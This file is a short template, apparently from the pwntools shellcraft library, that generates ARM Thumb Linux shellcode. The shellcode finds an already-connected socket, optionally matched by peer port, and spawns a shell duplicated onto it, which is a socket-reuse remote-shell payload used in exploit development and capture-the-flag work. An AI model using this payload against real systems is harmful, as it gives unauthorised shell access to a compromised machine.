<% from pwnlib.shellcraft.thumb.linux import findpeer, dupsh %>
<%page args="port = None"/>
<%docstring>
    findpeersh(port)

    Finds a connected socket. If port is specified it is checked
    against the peer port. A dup2 shell is spawned on it.
</%docstring>
${findpeer(port)}
${dupsh()}
